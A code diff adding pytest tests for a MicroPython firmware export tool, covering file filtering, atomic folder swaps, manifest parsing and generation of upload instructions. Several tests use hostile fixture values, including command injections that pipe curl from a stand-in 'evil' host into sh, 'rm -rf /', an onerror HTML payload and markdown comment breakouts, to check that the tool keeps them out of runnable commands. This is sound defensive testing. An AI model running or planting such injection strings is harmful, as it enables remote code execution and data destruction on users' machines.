@@ -13,6 +13,7 @@ from serve import (
     Shim,
     _dispatch,
     _list_files,
+    iter_uploadable_firmware,
     map_install_error,
     parse_scan_output,
     resolve_schema,
@@ -459,6 +460,56 @@ def test_deploy_firmware_tree_skips_gitkeep_and_only_walks_firmware(tmp_path):
     targets = [c[-1] for c in shim.commands if c[4] == "fs" and c[5] == "cp"]
     # Only the firmware/ .py file ships — no .gitkeep, no manifest/docs siblings.
     assert targets == [":tasks/sensor.py"]
+
+
+def test_deploy_firmware_tree_excludes_mocks_pycache_and_flash_images(tmp_path):
+    # The contract bug this fixes: previously only .gitkeep was skipped here, so a
+    # driver's mock.py/mock.mpy test double, a __pycache__ .pyc, and a flash image all
+    # shipped to the board (the reported "takes up the board's memory" complaint).
+    # A NESTED .bin (a real driver asset, e.g. GraftSense's bma423_driver ships
+    # bma423conf.bin next to its .py and reads it back at runtime) must still deploy --
+    # only a TOP-LEVEL flash image is a flash-phase input, never a device-fs file.
+    fw = tmp_path / "firmware"
+    (fw / "drivers" / "foo_driver").mkdir(parents=True)
+    (fw / "drivers" / "foo_driver" / "__init__.py").write_text("class Foo: pass", encoding="utf-8")
+    (fw / "drivers" / "foo_driver" / "mock.py").write_text("class MockFoo: pass", encoding="utf-8")
+    (fw / "drivers" / "foo_driver" / "mock.mpy").write_bytes(b"\x00")
+    (fw / "drivers" / "foo_driver" / "foo_conf.bin").write_bytes(b"\x00")
+    (fw / "__pycache__").mkdir()
+    (fw / "__pycache__" / "boot.cpython-312.pyc").write_bytes(b"\x00")
+    (fw / "RPI_PICO-20260406-v1.28.0.uf2").write_bytes(b"\x00")
+    (fw / "main.py").write_text("m", encoding="utf-8")
+    shim = Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 0, "", ""))
+
+    result = shim.deploy_firmware_tree("COM3", str(fw))
+
+    assert result == {"status": "ok"}
+    targets = [c[-1] for c in shim.commands if c[4] == "fs" and c[5] == "cp"]
+    assert ":drivers/foo_driver/__init__.py" in targets
+    assert ":drivers/foo_driver/foo_conf.bin" in targets, "a nested .bin is a device asset, not a flash image"
+    assert ":drivers/foo_driver/mock.py" not in targets
+    assert ":drivers/foo_driver/mock.mpy" not in targets
+    assert not any(t.endswith(".pyc") for t in targets)
+    assert not any(t.endswith(".uf2") for t in targets)
+    assert targets[-1] == ":main.py"
+
+
+def test_iter_uploadable_firmware_excludes_top_level_flash_images_but_keeps_nested_device_assets(tmp_path):
+    # *.uf2/*.bin/*.hex are excluded ONLY at firmware/'s top level, where a flash image
+    # actually lands. Nested under firmware/lib/ or firmware/drivers/, a .bin/.hex is a
+    # legitimate device-side driver asset (read back from the device fs at runtime) --
+    # excluding it there silently breaks the driver, which is what this test locks.
+    fw = tmp_path / "firmware"
+    (fw / "lib").mkdir(parents=True)
+    (fw / "lib" / "keep.py").write_text("k", encoding="utf-8")
+    (fw / "lib" / "image.bin").write_bytes(b"\x00")
+    (fw / "top_level.bin").write_bytes(b"\x00")
+    (fw / "firmware.hex").write_text(":00000001FF", encoding="utf-8")
+    (fw / "RPI_PICO.uf2").write_bytes(b"\x00")
+
+    rels = sorted(rel for _src, rel in iter_uploadable_firmware(str(fw)))
+
+    assert rels == ["lib/image.bin", "lib/keep.py"]
 
 
 def test_install_errors_are_classified():
@@ -1236,6 +1287,654 @@ def test_probe_micropython_uses_a_short_timeout():
     Shim(runner=runner).probe_micropython("COM3")
 
     assert calls[0][1]["timeout"] == 5
+
+
+def _build_upload_ready_project(project_dir, manifest=None):
+    """The project tree the export tests share: a firmware/ carrying one of every
+    excluded shape (mock.py/mock.mpy, __pycache__/*.pyc, tasks/.gitkeep) alongside the
+    real device files, plus sibling tools/ and test/pc/ that must never reach the
+    export. `manifest`, when given, is written to project-manifest.json."""
+    fw = project_dir / "firmware"
+    (fw / "lib").mkdir(parents=True)
+    (fw / "lib" / "a.py").write_text("a", encoding="utf-8")
+    (fw / "drivers" / "foo_driver").mkdir(parents=True)
+    (fw / "drivers" / "foo_driver" / "__init__.py").write_text("class Foo: pass", encoding="utf-8")
+    (fw / "drivers" / "foo_driver" / "mock.py").write_text("class MockFoo: pass", encoding="utf-8")
+    (fw / "drivers" / "foo_driver" / "mock.mpy").write_bytes(b"\x00")
+    (fw / "__pycache__").mkdir()
+    (fw / "__pycache__" / "x.pyc").write_bytes(b"\x00")
+    (fw / "tasks").mkdir()
+    (fw / "tasks" / ".gitkeep").write_text("", encoding="utf-8")
+    (fw / "main.py").write_text("m", encoding="utf-8")
+    (fw / "boot.py").write_text("b", encoding="utf-8")
+    (fw / "README.md").write_text("device notes", encoding="utf-8")
+    (project_dir / "tools").mkdir()
+    (project_dir / "tools" / "flash_device.py").write_text("# host helper", encoding="utf-8")
+    (project_dir / "test" / "pc").mkdir(parents=True)
+    (project_dir / "test" / "pc" / "test_a.py").write_text("def test_x(): pass", encoding="utf-8")
+    if manifest is not None:
+        (project_dir / "project-manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
+    return project_dir
+
+
+def _two_mip_manifest():
+    return {
+        "mcu": {"model": "ESP32-C3-MINI-1"},
+        "generate": {
+            "runtime_dependencies": {
+                "mip": [
+                    {"package": "aht20", "version": "1.0.0", "target": "/lib", "verify_import": "aht20", "install_phase": "deploy"},
+                    {"package": "aioble", "version": "latest", "target": "/lib", "verify_import": "aioble", "install_phase": "deploy", "asset_files": ["extra.bin"]},
+                ],
+            },
+        },
+    }
+
+
+def _noop_shim():
+    # project.export_upload_ready is filesystem-only; the shim instance is never
+    # touched, but _dispatch's signature still takes one.
+    return Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 0, "", ""))
+
+
+def _minimal_firmware_project(project_dir, manifest=None):
+    """A leaner fixture than _build_upload_ready_project: just firmware/main.py, no
+    firmware/README.md -- for tests about mip/README parsing where a device README
+    landing at the same export path would be an unrelated confound."""
+    fw = project_dir / "firmware"
+    fw.mkdir(parents=True)
+    (fw / "main.py").write_text("m", encoding="utf-8")
+    if manifest is not None:
+        (project_dir / "project-manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
+    return project_dir
+
+
+def test_export_upload_ready_keeps_the_previous_export_when_a_copy_fails(monkeypatch, tmp_path):
+    """The folder's whole purpose is restoring a board, so a half-written one that LOOKS
+    complete is worse than a failed export: it would be uploaded and brick the device.
+    A mid-copy failure must leave the previous, complete export exactly as it was."""
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+    assert _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})["status"] == "ok"
+    export_dir = project / "upload_ready"
+    before = {p.name: p.read_bytes() for p in export_dir.rglob("*") if p.is_file()}
+    assert before, "the first export produced something to protect"
+
+    import serve
+    real_copy2 = serve.shutil.copy2
+    calls = {"n": 0}
+
+    def failing_copy2(src, dst, *args, **kwargs):
+        calls["n"] += 1
+        if calls["n"] == 2:  # part-way through, so a partial tree exists in staging
+            raise OSError(28, "No space left on device")
+        return real_copy2(src, dst, *args, **kwargs)
+
+    monkeypatch.setattr(serve.shutil, "copy2", failing_copy2)
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "error"
+    assert result["error_kind"] == "export_write_failed"
+    after = {p.name: p.read_bytes() for p in export_dir.rglob("*") if p.is_file()}
+    assert after == before, "the previous export is untouched, not wiped or half-replaced"
+    assert not (project / "upload_ready.staging").exists(), "the failed attempt cleans up after itself"
+
+
+def test_export_upload_ready_names_where_the_export_is_when_rollback_also_fails(monkeypatch, tmp_path):
+    """The swap moves the old export aside, so if BOTH the install and the rollback rename
+    fail the user's only complete folder is sitting under a name they have never heard of.
+    Letting that OSError escape would hand them a generic RPC error and no way to find it."""
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+    assert _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})["status"] == "ok"
+
+    import serve
+    real_rename = serve.os.rename
+
+    def failing_rename(src, dst, *args, **kwargs):
+        # Let the "move the old aside" rename through, fail the install AND the rollback.
+        if str(src).endswith("upload_ready") and str(dst).endswith(".previous"):
+            return real_rename(src, dst, *args, **kwargs)
+        raise OSError(13, "Permission denied")
+
+    monkeypatch.setattr(serve.os, "rename", failing_rename)
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "error"
+    assert result["error_kind"] == "export_rollback_failed", "not the generic swap failure, and not an escaped OSError"
+    backup = project / "upload_ready.previous"
+    assert result["path"] == str(backup), "the result names where the folder actually is"
+    assert "upload_ready" in result["message"], "and the message says what to do about it"
+    assert (backup / "main.py").exists(), "the user's complete export still exists, under the backup name"
+
+
+def test_export_upload_ready_cleanup_failure_does_not_mask_the_real_error(monkeypatch, tmp_path):
+    """Cleanup runs on an already-failing path. An rmtree error there would replace the real
+    diagnosis with a confusing one about a scratch directory."""
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+
+    import serve
+    real_copy2 = serve.shutil.copy2
+
+    def failing_copy2(src, dst, *args, **kwargs):
+        raise OSError(28, "No space left on device")
+
+    def failing_rmtree(path, *args, **kwargs):
+        raise OSError(13, "Permission denied")
+
+    monkeypatch.setattr(serve.shutil, "copy2", failing_copy2)
+    monkeypatch.setattr(serve.shutil, "rmtree", failing_rmtree)
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "error"
+    assert result["error_kind"] == "export_write_failed", "the copy failure is what gets reported"
+    assert "No space left" in result["message"]
+
+
+def test_export_upload_ready_reports_ok_when_only_the_backup_cleanup_fails(monkeypatch, tmp_path):
+    """Both renames have succeeded by then, so upload_ready/ is complete and installed.
+    Dropping the backup is housekeeping: failing the whole export over it would tell the
+    user their export failed and send them to retry something that already worked."""
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+    assert _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})["status"] == "ok"
+
+    import serve
+    real_rmtree = serve.shutil.rmtree
+
+    def rmtree_failing_only_on_the_backup(path, *args, **kwargs):
+        if str(path).endswith("upload_ready.previous"):
+            raise OSError(13, "Permission denied")
+        return real_rmtree(path, *args, **kwargs)
+
+    monkeypatch.setattr(serve.shutil, "rmtree", rmtree_failing_only_on_the_backup)
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "ok", "a housekeeping failure is not an export failure"
+    assert result["file_count"] == 5, "the export really was installed"
+    assert (project / "upload_ready" / "main.py").exists()
+    # Reported, not swallowed: it is a real directory the user may want to remove.
+    assert result["leftover"] == str(project / "upload_ready.previous")
+
+
+def test_export_upload_ready_leaves_no_scratch_directories_behind(tmp_path):
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})  # regenerate
+
+    siblings = {p.name for p in project.iterdir() if p.is_dir()}
+    assert "upload_ready.staging" not in siblings
+    assert "upload_ready.previous" not in siblings, "the old tree is dropped once the swap succeeds"
+
+
+def test_export_upload_ready_clears_a_leftover_staging_tree_from_an_interrupted_run(tmp_path):
+    """A killed process can leave staging behind. It is scratch the export owns, so the
+    next run reclaims it rather than failing or, worse, merging into it."""
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+    staging = project / "upload_ready.staging"
+    staging.mkdir()
+    (staging / "junk_from_a_dead_run.py").write_text("x", encoding="utf-8")
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "ok"
+    assert not staging.exists()
+    assert not (project / "upload_ready" / "junk_from_a_dead_run.py").exists(), "the leftover never leaks into the export"
+
+
+def test_export_upload_ready_refuses_a_symlink_planted_at_the_scratch_paths(tmp_path):
+    """Same reasoning as the export path itself: this routine rmtree-s the scratch dirs,
+    so a symlink there would delete whatever it points at."""
+    for scratch_name in ("upload_ready.staging", "upload_ready.previous"):
+        project = _build_upload_ready_project(tmp_path / scratch_name, manifest=_two_mip_manifest())
+        outside = tmp_path / f"outside-{scratch_name}"
+        outside.mkdir()
+        (outside / "keep.txt").write_text("precious", encoding="utf-8")
+        try:
+            os.symlink(str(outside), str(project / scratch_name), target_is_directory=True)
+        except (OSError, NotImplementedError):
+            pytest.skip("symlink creation requires privilege on this platform")
+
+        result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+        assert result["status"] == "error", scratch_name
+        assert result["error_kind"] == "export_dir_is_symlink", scratch_name
+        assert (outside / "keep.txt").exists(), f"{scratch_name}: the symlink target is untouched"
+
+
+def test_export_upload_ready_copies_firmware_excluding_mocks_pycache_gitkeep_and_siblings(tmp_path):
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "ok"
+    export_dir = project / "upload_ready"
+    rels = set()
+    for root, _dirs, files in os.walk(export_dir):
+        for name in files:
+            rels.add(os.path.relpath(os.path.join(root, name), export_dir).replace("\\", "/"))
+    # Mocks, __pycache__, .gitkeep, and the sibling tools/ + test/pc/ trees never appear.
+    # firmware/README.md (a legitimate device file) is preserved AS README.md, so the
+    # generated mip-instructions doc lands at the fallback name instead.
+    assert rels == {"main.py", "boot.py", "README.md", "lib/a.py", "drivers/foo_driver/__init__.py", "UPLOAD_INSTRUCTIONS.md"}
+    assert result["file_count"] == 5  # firmware copies only; UPLOAD_INSTRUCTIONS.md is generated separately
+    assert result["mip_count"] == 2
+    assert result["path"] == str(export_dir)
+    assert (export_dir / "README.md").read_text(encoding="utf-8") == "device notes", "the device's own README survives byte-for-byte"
+
+
+def test_export_upload_ready_readme_lists_pinned_and_latest_mip_installs(tmp_path):
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+
+    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    # firmware/README.md exists in this fixture, so the generated instructions land at
+    # the fallback name (see the fallback-name test) rather than clobbering it.
+    readme = (project / "upload_ready" / "UPLOAD_INSTRUCTIONS.md").read_text(encoding="utf-8")
+    assert "mip install aht20@1.0.0" in readme  # pinned version appended
+    assert "mip install aioble" in readme
+    assert "aioble@latest" not in readme  # "latest" is never appended
+    assert "extra.bin" in readme  # asset_files noted
+
+
+def test_export_upload_ready_readme_says_no_packages_without_runtime_dependencies(tmp_path):
+    project = _minimal_firmware_project(tmp_path / "project", manifest={"mcu": {"model": "ESP32-S3"}})
+
+    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+    assert "No external packages required." in readme
+    assert "mip install" not in readme
+
+
+def test_export_upload_ready_readme_command_names_device_files_and_not_itself(tmp_path):
+    """`./*` would upload the generated instructions file onto the device (it lives inside
+    the folder the command runs from). Explicit names keep it on the PC -- and work as-is
+    in PowerShell/cmd, which never expanded the glob for mpremote anyway."""
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+
+    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    readme = (project / "upload_ready" / "UPLOAD_INSTRUCTIONS.md").read_text(encoding="utf-8")
+    assert "./*" not in readme
+    prefix = "mpremote connect <port> fs cp -r "
+    command = next(line for line in readme.splitlines() if line.startswith(prefix))
+    assert command.endswith(" :")
+    named = command[len(prefix):-2].split()
+    # The fixture's device files, top level only -- and never the instructions file.
+    assert named == ["README.md", "boot.py", "drivers", "lib", "main.py"]
+
+
+def test_export_upload_ready_missing_manifest_says_unknown_not_no_deps(tmp_path):
+    """A pre-manifest project may well import external packages; 'No external packages
+    required.' is a claim the tool cannot make there. Say what is actually known."""
+    project = _minimal_firmware_project(tmp_path / "project")
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "ok", "a missing manifest stays a normal, exportable state"
+    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+    assert "No external packages required." not in readme
+    assert "No project-manifest.json was found" in readme
+
+
+def test_export_upload_ready_regeneration_removes_stale_files(tmp_path):
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+    export_dir = project / "upload_ready"
+    stale = export_dir / "stale.py"
+    stale.write_text("leftover", encoding="utf-8")
+    (project / "firmware" / "lib" / "a.py").unlink()
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "ok"
+    assert not stale.exists(), "a file that only ever existed in a PRIOR export must not survive regeneration"
+    assert not (export_dir / "lib" / "a.py").exists(), "a source file deleted from firmware/ must vanish from the export too"
+
+
+def test_export_upload_ready_non_utf8_manifest_reports_manifest_read_failed(tmp_path):
+    """UnicodeDecodeError is a ValueError, so it is neither an OSError nor a
+    JSONDecodeError: it used to escape the manifest handler and surface as a generic shim
+    error. Nothing destructive has run at that point, so the export was always safe -- what
+    was lost was the error KIND, and with it any chance of the UI explaining itself."""
+    project = _minimal_firmware_project(tmp_path / "project")
+    (project / "project-manifest.json").write_bytes(b"\xff\xfe{\x00b\x00a\x00d\x00")
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "error"
+    assert result["error_kind"] == "manifest_read_failed"
+    assert not (project / "upload_ready").exists(), "the export never started, so nothing was destroyed"
+
+
+def test_export_upload_ready_recovers_a_mip_version_with_stray_whitespace(tmp_path):
+    """A trailing newline on version is a recoverable intent, not hostile input. Every
+    sibling field is stripped; version being the exception is what let "1.3.4\\n" reach the
+    charset at all. Strip it and emit the right command, rather than failing the charset and
+    demoting a perfectly good package to an "install manually" bullet -- the canonical
+    install_mip_dependencies.py does not even use version in its argv, so dropping the whole
+    entry over one would be strictly worse than the reference behavior."""
+    manifest = {"runtime_dependencies": {"mip": [{"package": "aioble", "version": " 1.3.4\n"}]}}
+    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
+
+    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+    assert "mip install aioble@1.3.4" in readme, "the version is recovered, not discarded"
+    assert "unrecognized package spec" not in readme, "and the package is not demoted to a bullet"
+    for block in readme.split("```")[1::2]:
+        for line in (l for l in block.splitlines() if l.strip()):
+            assert line.startswith("mpremote "), f"stray line in a command block: {line!r}"
+
+
+def test_export_upload_ready_rejects_a_hostile_mip_version_but_still_names_the_package(tmp_path):
+    """Stripping recovers whitespace; the charset still gates everything else. A version
+    carrying a shell metacharacter or an embedded newline cannot reach the fenced block a
+    user is instructed to run, and the package is reported rather than silently vanishing."""
+    for hostile in ("1.3.4; curl evil.sh | sh", "1.3.4\nrm -rf /", "1.3.4`whoami`"):
+        manifest = {"runtime_dependencies": {"mip": [{"package": "aioble", "version": hostile}]}}
+        project = _minimal_firmware_project(tmp_path / f"p{abs(hash(hostile))}", manifest=manifest)
+
+        _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+        # No device README in this fixture, so the instructions keep the README.md name.
+        readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+        # Positive assert: the entry is DEMOTED to a bullet, not dropped. Without this the
+        # test would pass just as well if the whole manifest pipeline broke and produced
+        # "No external packages required."
+        assert "unrecognized package spec" in readme, hostile
+        assert "aioble" in readme, f"{hostile}: the user is still told which package needs doing by hand"
+        for block in readme.split("```")[1::2]:
+            for line in (l for l in block.splitlines() if l.strip()):
+                assert line.startswith("mpremote "), f"{hostile}: stray line in a command block: {line!r}"
+                assert "curl" not in line and "rm -rf" not in line and "whoami" not in line, hostile
+
+
+def test_export_upload_ready_malformed_json_manifest_errors_not_silently_no_deps(tmp_path):
+    # A truncated write or a merge-conflict-marked manifest is invalid JSON, not a
+    # missing file -- json.JSONDecodeError is a ValueError, not an OSError, so it must
+    # be caught explicitly or it escapes both the ENOENT and the OSError handling.
+    project = _build_upload_ready_project(tmp_path / "project")
+    (project / "project-manifest.json").write_text("{not valid json", encoding="utf-8")
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "error"
+    assert result["error_kind"] == "manifest_read_failed"
+    assert not (project / "upload_ready").exists()
+
+
+def test_export_upload_ready_manifest_read_failure_errors_not_silently_no_deps(tmp_path):
+    if sys.platform == "win32":
+        pytest.skip("chmod(0o000) only sets read-only on Windows; the read succeeds and the premise never arises")
+    project = _build_upload_ready_project(tmp_path / "project")
+    manifest_path = project / "project-manifest.json"
+    manifest_path.write_text("{}", encoding="utf-8")
+    manifest_path.chmod(0o000)
+    try:
+        result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+    finally:
+        manifest_path.chmod(0o644)  # restore so pytest's tmp_path cleanup can remove it
+
+    assert result["status"] == "error"
+    assert result["error_kind"] == "manifest_read_failed"
+    assert not (project / "upload_ready").exists(), "an unreadable manifest must fail BEFORE the old export is touched"
+
+
+def test_export_upload_ready_refuses_a_preexisting_symlink_export_dir_target_untouched(tmp_path):
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+    outside = tmp_path / "outside-target"
+    outside.mkdir()
+    (outside / "keepme.txt").write_text("do not touch", encoding="utf-8")
+    (project / "upload_ready").symlink_to(outside, target_is_directory=True)
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "error"
+    assert result["error_kind"] == "export_dir_is_symlink"
+    assert (outside / "keepme.txt").exists(), "rmtree must never run through the symlink"
+    assert (project / "upload_ready").is_symlink(), "the symlink itself is left in place, not replaced"
+
+
+def test_export_upload_ready_refuses_a_preexisting_regular_file_at_the_export_path(tmp_path):
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+    (project / "upload_ready").write_text("not a directory", encoding="utf-8")
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "error"
+    assert result["error_kind"] == "export_dir_not_a_directory"
+    assert (project / "upload_ready").read_text(encoding="utf-8") == "not a directory", "the file is left untouched, not silently rmtree'd"
+
+
+def test_export_upload_ready_accepts_a_bare_string_mip_entry(tmp_path):
+    # mip[] entries are contract-legal as either a bare package-name string or an
+    # object (upy-deploy-plugin's normalize_mip_entry accepts both); the export must
+    # not crash on the string form after upload_ready/ has already been wiped.
+    manifest = {"mcu": {"model": "ESP32"}, "generate": {"runtime_dependencies": {"mip": ["unittest"]}}}
+    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "ok"
+    assert result["mip_count"] == 1
+    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+    assert "mip install unittest" in readme
+
+
+def test_export_upload_ready_dedups_the_string_and_object_forms_of_the_same_package(tmp_path):
+    # verify_import must default to the SAME value (package.replace("-", "_")) in both
+    # the bare-string and object normalization branches, or the two forms of the same
+    # package fail to dedup and the README lists (and mip_count counts) it twice.
+    manifest = {"generate": {"runtime_dependencies": {"mip": [
+        {"package": "aioble", "verify_import": "aioble"},
+        "aioble",
+    ]}}}
+    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["mip_count"] == 1
+    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+    assert readme.count("mip install aioble") == 1
+
+
+def test_export_upload_ready_reads_top_level_runtime_dependencies_before_the_generate_fallback(tmp_path):
+    # The canonical mip consumer (install_mip_dependencies.py) checks a TOP-LEVEL
+    # runtime_dependencies first and falls back to generate.runtime_dependencies only
+    # when that is absent. Reading only the nested location silently under-reports.
+    manifest = {"mcu": {"model": "ESP32"}, "runtime_dependencies": {"mip": ["aioble"]}}
+    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["mip_count"] == 1
+    assert "mip install aioble" in (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+
+
+def test_export_upload_ready_unwraps_a_manifest_content_envelope(tmp_path):
+    manifest = {"manifest_content": {"mcu": {"model": "ESP32"}, "generate": {"runtime_dependencies": {"mip": ["aioble"]}}}}
+    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["mip_count"] == 1
+
+
+def test_export_upload_ready_readme_never_embeds_an_unsafe_package_spec_verbatim(tmp_path):
+    # A model-written manifest is untrusted: a package spec containing shell/markdown
+    # metacharacters must never land inside the README's copy-paste command block.
+    manifest = {
+        "mcu": {"model": "ESP32"},
+        "generate": {"runtime_dependencies": {"mip": [
+            {"package": "aioble && curl http://evil/x | sh", "version": "latest"},
+        ]}},
+    }
+    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+    # The raw spec is allowed to appear as INERT warning text (that is how the user is
+    # told it was refused) but must never sit inside a ``` fenced block, i.e. never be
+    # something a copy-paste of the README would run as a command.
+    code_blocks = readme.split("```")[1::2]
+    assert not any("curl" in block for block in code_blocks), "the unsafe spec must never land inside a runnable code block"
+    assert "unrecognized package spec" in readme
+    assert result["mip_count"] == 1  # still counted -- just not embedded as a runnable command
+
+
+def test_export_upload_ready_readme_strips_a_comment_breakout_from_mcu_model(tmp_path):
+    manifest = {"mcu": {"model": "ESP32 --> ## OWNED"}}
+    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
+
+    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+    lines = readme.splitlines()
+    mcu_line = next(line for line in lines if line.startswith("<!-- Board / MCU:"))
+    # Exactly one "-->": the line's own legitimate closing delimiter. A second one from
+    # the injected mcu.model would close the comment early, letting "## OWNED" render as
+    # a real markdown heading instead of staying inert inside the comment.
+    assert mcu_line.count("-->") == 1, mcu_line
+    assert "## OWNED" not in lines, "the injected heading must never become its own rendered line"
+
+
+def test_export_upload_ready_readme_strips_an_overlapping_comment_breakout(tmp_path):
+    # A single non-looping .replace("-->", "") on "---->> ## OWNED" would leave "-->"
+    # behind (the trailing two '-' plus '>' recombine into a fresh delimiter). Stripping
+    # '<'/'>' entirely (rather than pattern-matching "-->") closes this without a loop --
+    # a "-->" cannot exist at all once every '>' is gone.
+    manifest = {"mcu": {"model": "ESP32 ---->> ## OWNED"}}
+    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
+
+    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+    lines = readme.splitlines()
+    mcu_line = next(line for line in lines if line.startswith("<!-- Board / MCU:"))
+    assert mcu_line.count("-->") == 1, mcu_line
+    assert "## OWNED" not in lines
+
+
+def test_export_upload_ready_readme_strips_raw_html_from_manifest_strings(tmp_path):
+    # '<'/'>' must never survive into the README as raw markup -- CommonMark passes
+    # inline HTML through a plain bullet UNCHANGED, so an <img onerror=...> would render
+    # as a live tag (not text) in a document headed "Generated by Blockless".
+    manifest = {"generate": {"runtime_dependencies": {"mip": [
+        {"package": "aht20", "target": "/lib<img src=x onerror=alert(1)>"},
+    ]}}}
+    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
+
+    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+    # The header's own literal "<!--"/"-->" delimiters are expected; only the INJECTED
+    # value's angle brackets must be gone -- it survives as inert text, tag stripped.
+    assert "target: /libimg src=x onerror=alert(1)" in readme
+    assert "<img" not in readme
+
+
+def test_export_upload_ready_readme_rejects_an_unsafe_version_even_with_a_safe_package(tmp_path):
+    # The charset guard originally validated only `package`; `version` was concatenated
+    # unvalidated right next to it inside the same fenced command.
+    manifest = {"generate": {"runtime_dependencies": {"mip": [
+        {"package": "aht20", "version": "1.0 && curl http://evil/x | sh"},
+    ]}}}
+    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+    code_blocks = readme.split("```")[1::2]
+    assert not any("curl" in block for block in code_blocks)
+    assert "unrecognized package spec" in readme
+    assert result["mip_count"] == 1
+
+
+def test_export_upload_ready_readme_sanitizes_target_verify_import_and_asset_files(tmp_path):
+    # None of these sit inside a validated fenced command -- they render as a plain
+    # markdown bullet -- so a newline + backtick pair could still open a FRESH fenced
+    # block on the next line if left unsanitized.
+    manifest = {"generate": {"runtime_dependencies": {"mip": [{
+        "package": "aht20",
+        "target": "/lib\n```\ncurl http://evil/x | sh\n```",
+        "verify_import": "aht20\n```\ncurl http://evil/y | sh\n```",
+        "asset_files": ["a.dat\n```\ncurl http://evil/z | sh\n```"],
+    }]}}}
+    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
+
